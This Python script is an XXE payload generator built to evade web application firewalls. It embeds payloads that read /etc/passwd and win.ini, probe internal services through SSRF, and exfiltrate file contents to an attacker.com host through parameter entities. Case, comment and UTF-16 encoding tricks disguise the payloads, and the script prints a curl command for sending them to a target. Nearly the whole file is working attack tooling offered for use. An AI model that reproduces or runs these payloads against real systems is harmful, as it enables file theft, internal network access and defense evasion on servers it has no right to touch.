#!/usr/bin/env python3
"""
XXE Payload Generator with WAF Bypass via Character Encoding
This tool generates various XXE payloads and encodes them in different formats
to attempt WAF bypass techniques on Windows, Linux and other operating systems.
"""

import argparse
import base64
import os
import subprocess
import sys
from typing import List, Dict, Tuple


class XXEPayloadGenerator:
    def __init__(self):
        self.basic_payloads = [
            # Linux file read
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>""",
            
            # Windows file read
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<foo>&xxe;</foo>""",
            
            # SSRF example
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service:8080/sensitive-data"> ]>
<foo>&xxe;</foo>""",
            
            # UNC Path (Windows network shares)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:////\\\\server\\share"> ]>
<foo>&xxe;</foo>""",
            
            # Parameter entities
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
]>
<data>Test</data>""",
            
            # PHP wrapper Linux example
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<replace>&xxe;</replace>""",
            
            # PHP wrapper Windows example
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/win.ini"> ]>
<replace>&xxe;</replace>""",
            
            # Error-based XXE (Linux)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY &#x25; eval SYSTEM 'file:///nonexistent/%file;'>">
%error;
%eval;
]>
<data>Test</data>""",
            
            # Error-based XXE (Windows)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % error "<!ENTITY &#x25; eval SYSTEM 'file:///nonexistent/%file;'>">
%error;
%eval;
]>
<data>Test</data>""",
            
            # XXE com Data URI (multi-plataforma)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data:text/plain,payload"> ]>
<foo>&xxe;</foo>"""
        ]
        
        # Supported encodings for WAF bypass
        self.encodings = [
            "UTF-8",
            "UTF-16LE",
            "UTF-16BE",
            "ISO-8859-1",
            "CP1252"
        ]
        
        # Common XML obfuscation techniques
        self.obfuscation_techniques = {
            "case_variation": self._case_variation,
            "entity_encoding": self._entity_encoding,
            "whitespace_manipulation": self._whitespace_manipulation,
            "xml_comment_insertion": self._xml_comment_insertion
        }

    def _case_variation(self, payload: str) -> str:
        """Vary the case of DOCTYPE, ENTITY, SYSTEM keywords."""
        variations = {
            "DOCTYPE": "dOcTyPe",
            "ENTITY": "EnTiTy",
            "SYSTEM": "SyStEm",
            "PUBLIC": "PuBlIc",
            "xml": "XmL"
        }
        
        result = payload
        for original, varied in variations.items():
            result = result.replace(original, varied)
        
        return result
    
    def _entity_encoding(self, payload: str) -> str:
        """Use hex or decimal entity encoding for special characters."""
        # Example: Convert < to &#x3c;
        encoded = payload.replace("<", "&#x3c;")
        encoded = encoded.replace(">", "&#x3e;")
        
        return encoded
    
    def _whitespace_manipulation(self, payload: str) -> str:
        """Add extra whitespace in XML structure."""
        # Add spaces after < and before >
        result = payload.replace("<", "< ")
        result = result.replace(">", " >")
        
        return result
    
    def _xml_comment_insertion(self, payload: str) -> str:
        """Insert XML comments to break pattern matching."""
        # Insert comments in key locations
        result = payload.replace("DOCTYPE", "DOC<!--comment-->TYPE")
        result = result.replace("ENTITY", "EN<!--comment-->TITY")
        
        return result
    
    def generate_payloads(self) -> List[Dict[str, str]]:
        """Generate all basic payloads."""
        return [{"name": f"basic_xxe_{i}", "payload": payload} 
                for i, payload in enumerate(self.basic_payloads)]
    
    def apply_obfuscation(self, payload: str, technique_name: str) -> str:
        """Apply specific obfuscation technique to a payload."""
        if technique_name in self.obfuscation_techniques:
            return self.obfuscation_techniques[technique_name](payload)
        return payload
    
    def generate_obfuscated_payloads(self) -> List[Dict[str, str]]:
        """Generate payloads with different obfuscation techniques."""
        results = []
        
        for i, payload in enumerate(self.basic_payloads):
            for technique_name in self.obfuscation_techniques:
                obfuscated = self.apply_obfuscation(payload, technique_name)
                results.append({
                    "name": f"obfuscated_xxe_{i}_{technique_name}",
                    "payload": obfuscated,
                    "technique": technique_name
                })
        
        return results
    
    def update_xml_declaration(self, payload: str, target_encoding: str) -> str:
        """Update XML declaration to match target encoding."""
        if "<?xml" in payload and "encoding=" in payload:
            # Extract the declaration part
            declaration_end = payload.find("?>") + 2
            declaration = payload[:declaration_end]
            rest_of_payload = payload[declaration_end:]
            
            # Replace encoding in declaration
            import re
            updated_declaration = re.sub(
                r'encoding="[^"]*"', 
                f'encoding="{target_encoding}"', 
                declaration
            )
            
            return updated_declaration + rest_of_payload
        elif "<?xml" in payload:
            # Has XML declaration but no encoding - insert encoding attribute
            declaration_end = payload.find("?>")
            declaration = payload[:declaration_end]
            rest_of_payload = payload[declaration_end:]
            
            # Insert encoding before the closing ?>
            updated_declaration = declaration.replace("?>", f' encoding="{target_encoding}"?>')
            
            return updated_declaration + rest_of_payload
        else:
            # No XML declaration - add one
            return f'<?xml version="1.0" encoding="{target_encoding}"?>\n{payload}'
    
    def convert_with_python(self, payload: str, encoding: str) -> bytes:
        """Convert payload to specified encoding using Python's built-in methods."""
        # First update the XML declaration
        updated_payload = self.update_xml_declaration(payload, encoding)
        
        # Now encode with the correct BOM handling
        if encoding == "UTF-16LE":
            # Manually add BOM for UTF-16LE
            encoded_bytes = b'\xff\xfe' + updated_payload.encode('utf-16-le')[2:]
        elif encoding == "UTF-16BE":
            # Manually add BOM for UTF-16BE
            encoded_bytes = b'\xfe\xff' + updated_payload.encode('utf-16-be')[2:]
        elif encoding == "UTF-32LE":
            # Manually add BOM for UTF-32LE
            encoded_bytes = b'\xff\xfe\x00\x00' + updated_payload.encode('utf-32-le')[4:]
        elif encoding == "UTF-32BE":
            # Manually add BOM for UTF-32BE
            encoded_bytes = b'\x00\x00\xfe\xff' + updated_payload.encode('utf-32-be')[4:]
        else:
            # Regular encoding
            encoded_bytes = updated_payload.encode(encoding)
        
        return encoded_bytes
    
    def convert_with_iconv(self, input_file: str, output_file: str, encoding: str) -> bool:
        """Use iconv to convert file to specified encoding (Unix/Linux only)."""
        try:
            # Update the XML declaration in the input file first
            with open(input_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            updated_content = self.update_xml_declaration(content, encoding)
            
            # Write updated content back to a temp file
            temp_file = f"{input_file}.temp"
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(updated_content)
            
            # Use iconv to convert to target encoding
            subprocess.run(['iconv', '-f', 'UTF-8', '-t', encoding, temp_file, '-o', output_file], check=True)
            
            # Clean up temp file
            os.remove(temp_file)
            
            return True
        except Exception as e:
            print(f"Error using iconv: {str(e)}")
            return False
    
    def convert_encoding(self, payload: str, encoding: str) -> Tuple[bytes, str]:
        """Convert payload to specified encoding."""
        try:
            encoded_bytes = self.convert_with_python(payload, encoding)
            
            # Create a base64 representation for easier handling
            b64_encoded = base64.b64encode(encoded_bytes).decode('ascii')
            
            return encoded_bytes, b64_encoded
        except Exception as e:
            print(f"Error encoding to {encoding}: {str(e)}")
            return b"", ""
    
    def write_payload_to_file(self, payload_bytes: bytes, filename: str) -> None:
        """Write binary payload to file."""
        try:
            with open(filename, 'wb') as f:
                f.write(payload_bytes)
            print(f"Successfully wrote {len(payload_bytes)} bytes to {filename}")
            
            # Verify file was written correctly
            if os.path.exists(filename):
                file_size = os.path.getsize(filename)
                if file_size == len(payload_bytes):
                    print(f"Verified file size: {file_size} bytes")
                else:
                    print(f"Warning: File size mismatch. Expected {len(payload_bytes)}, got {file_size}")
        except Exception as e:
            print(f"Error writing file {filename}: {e}")
    
    def generate_all_encoded_variations(self, output_dir: str = "payloads") -> List[Dict]:
        """Generate all variations of payloads with different encodings."""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        results = []
        
        # Generate basic payloads
        basic_payloads = self.generate_payloads()
        
        # Generate obfuscated payloads
        obfuscated_payloads = self.generate_obfuscated_payloads()
        
        # Combine all payloads
        all_payloads = basic_payloads + obfuscated_payloads
        
        # Save original payloads in UTF-8 first
        for payload_info in all_payloads:
            payload = payload_info["payload"]
            name = payload_info["name"]
            
            # Create a filename for the original variant
            orig_filename = f"{output_dir}/{name}_original.xml"
            
            # Write original to file with UTF-8 encoding
            with open(orig_filename, 'w', encoding='utf-8') as f:
                f.write(payload)
                
            # Add to results
            results.append({
                "name": name,
                "encoding": "UTF-8 (Original)",
                "filename": orig_filename,
                "original_payload": payload
            })
            
            # Now apply each encoding
            for encoding in self.encodings:
                # Skip UTF-8 as we already saved the original
                if encoding == "UTF-8":
                    continue
                
                # Create filename for this encoding
                enc_filename = f"{output_dir}/{name}_{encoding.lower().replace('-', '_')}.xml"
                
                # Convert and write using our improved method
                encoded_bytes, _ = self.convert_encoding(payload, encoding)
                if encoded_bytes:
                    self.write_payload_to_file(encoded_bytes, enc_filename)
                    
                    # Add to results
                    results.append({
                        "name": name,
                        "encoding": encoding,
                        "filename": enc_filename,
                        "original_payload": payload
                    })
                else:
                    print(f"Failed to convert {name} to {encoding}")
        
        # Create verification file to help validate the generated files
        verification_file = f"{output_dir}/verify_encodings.py"
        with open(verification_file, 'w') as f:
            f.write("""#!/usr/bin/env python3
# Encoding verification script
import os
import sys

def check_file_encoding(filename):
    \"\"\"Check encoding of a file and display information.\"\"\"
    print(f"Checking: {filename}")
    
    with open(filename, 'rb') as f:
        content = f.read(100)  # First 100 bytes
    
    print(f"File size: {os.path.getsize(filename)} bytes")
    
    # Check for BOM
    if content.startswith(b'\\xff\\xfe'):
        if content.startswith(b'\\xff\\xfe\\x00\\x00'):
            print("Detected: UTF-32LE (has BOM)")
        else:
            print("Detected: UTF-16LE (has BOM)")
            
            # Try to decode and print first chars
            try:
                decoded = content.decode('utf-16')
                print(f"Content starts with: {decoded[:20]}")
            except:
                print("Could not decode as UTF-16")
    
    elif content.startswith(b'\\xfe\\xff'):
        if content.startswith(b'\\x00\\x00\\xfe\\xff'):
            print("Detected: UTF-32BE (has BOM)")
        else:
            print("Detected: UTF-16BE (has BOM)")
    
    elif content.startswith(b'\\xef\\xbb\\xbf'):
        print("Detected: UTF-8 with BOM")
    
    else:
        # No BOM - show raw hex for first 10 bytes
        hex_repr = ' '.join(f'{b:02x}' for b in content[:10])
        print(f"No BOM detected. First bytes: {hex_repr}")
        
        # Try different decodings
        for enc in ['utf-8', 'latin-1', 'cp1252']:
            try:
                decoded = content.decode(enc)
                print(f"Decoded as {enc}: {decoded[:20]}")
                break
            except:
                continue
    
    print("-" * 50)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # Check specific file
        check_file_encoding(sys.argv[1])
    else:
        # Check current directory
        for filename in os.listdir('.'):
            if filename.endswith('.xml'):
                check_file_encoding(filename)
""")
        
        os.chmod(verification_file, 0o755)  # Make executable
        
        print(f"\nCreated verification script: {verification_file}")
        print("Run this script to check if your encodings are correct.")
        
        return results
    
    def convert_custom_payload(self, payload: str, encodings: List[str] = None, output_dir: str = "payloads") -> List[Dict]:
        """Convert a custom payload to different encodings."""
        if encodings is None:
            encodings = self.encodings
            
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        results = []
        
        # First save the original UTF-8 version
        orig_filename = f"{output_dir}/custom_payload_original.xml"
        with open(orig_filename, 'w', encoding='utf-8') as f:
            f.write(payload)
        
        results.append({
            "encoding": "UTF-8 (Original)",
            "filename": orig_filename,
            "original_payload": payload
        })
        
        # Convert to each specified encoding
        for encoding in encodings:
            # Skip UTF-8 as we already saved the original
            if encoding == "UTF-8":
                continue
                
            output_filename = f"{output_dir}/custom_payload_{encoding.lower().replace('-', '_')}.xml"
            
            encoded_bytes, b64_encoded = self.convert_encoding(payload, encoding)
            
            if encoded_bytes:
                self.write_payload_to_file(encoded_bytes, output_filename)
                
                results.append({
                    "encoding": encoding,
                    "filename": output_filename,
                    "original_payload": payload
                })
                
        # Create a batch file to show encodings in a text editor (Windows)
        if os.name == 'nt':
            batch_file = f"{output_dir}/show_encodings.bat"
            with open(batch_file, 'w') as f:
                f.write('@echo off\n')
                f.write('echo Visualizando os arquivos gerados\n')
                f.write('echo =============================\n')
                for result in results:
                    f.write(f'echo.\n')
                    f.write(f'echo Arquivo: {result["filename"]}\n')
                    f.write(f'echo Codificação: {result["encoding"]}\n')
                    f.write(f'type "{result["filename"]}"\n')
                    f.write(f'echo =============================\n')
                f.write('pause\n')
        
        return results


def main():
    parser = argparse.ArgumentParser(description='XXE Payload Generator with WAF Bypass techniques')
    parser.add_argument('--output', '-o', default='payloads', help='Output directory for payloads')
    parser.add_argument('--custom', '-c', help='Custom payload to encode')
    parser.add_argument('--list-file', '-l', help='File containing custom payloads (one per line)')
    parser.add_argument('--encoding', '-e', action='append', 
                        help='Specific encoding to use (can be specified multiple times)')
    parser.add_argument('--obfuscate', action='store_true', 
                        help='Apply obfuscation techniques to payloads')
    parser.add_argument('--verify', action='store_true',
                        help='Verify encodings of generated files')
    
    args = parser.parse_args()
    
    generator = XXEPayloadGenerator()
    
    # Override encodings if specified
    if args.encoding:
        generator.encodings = args.encoding
    
    if args.custom:
        # Handle single custom payload
        print(f"\nProcessing custom payload...")
        results = generator.convert_custom_payload(args.custom, generator.encodings, args.output)
        
        print(f"Generated {len(results)} encoding variations for custom payload.")
        for i, result in enumerate(results):
            print(f"  [{i+1}] {result['encoding']} version saved to: {result['filename']}")
    
    elif args.list_file:
        # Handle file with multiple payloads
        if not os.path.exists(args.list_file):
            print(f"Error: File not found: {args.list_file}")
            return
            
        with open(args.list_file, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
            
        print(f"Processing {len(payloads)} payloads from {args.list_file}...")
        for i, payload in enumerate(payloads):
            results = generator.convert_custom_payload(
                payload, 
                generator.encodings, 
                f"{args.output}/payload_{i+1}"
            )
            
            print(f"  Payload {i+1}: Generated {len(results)} encoding variations.")
    
    else:
        # Generate all standard payloads
        print("\nGenerating standard XXE payloads with various encodings...")
        results = generator.generate_all_encoded_variations(args.output)
        print(f"Generated {len(results)} payload variations.")
        
        # Create a summary file
        summary_file = f"{args.output}/summary.txt"
        with open(summary_file, 'w') as f:
            f.write(f"XXE Payload Generator Summary\n")
            f.write(f"==========================\n\n")
            f.write(f"Total Payloads: {len(results)}\n\n")
            
            for i, result in enumerate(results):
                f.write(f"Payload {i+1}:\n")
                f.write(f"  Name: {result['name']}\n")
                f.write(f"  Encoding: {result['encoding']}\n")
                f.write(f"  Filename: {result['filename']}\n")
                if len(result["original_payload"]) > 500:
                    f.write(f"  Original payload (truncated):\n{result['original_payload'][:500]}...\n\n")
                else:
                    f.write(f"  Original payload:\n{result['original_payload']}\n\n")
        
        print(f"Summary written to: {summary_file}")
    
    # Print usage instructions
    print("\nUsage Instructions:")
    print("1. The original payloads are in UTF-8 format (*_original.xml)")
    print("2. Different encoding variations are in separate files")
    print("3. To validate encodings, use the verify_encodings.py script in the output directory")
    print("4. When testing against a target, try each encoding to see which bypasses the WAF")
    
    print("\nExample curl command for testing:")
    print(f"curl -X POST https://target.com/vulnerable-endpoint \\")
    print(f"  -H \"Content-Type: application/xml; charset=UTF-16LE\" \\")
    print(f"  --data-binary @{args.output}/basic_xxe_0_utf_16le.xml")


if __name__ == "__main__":
    main()
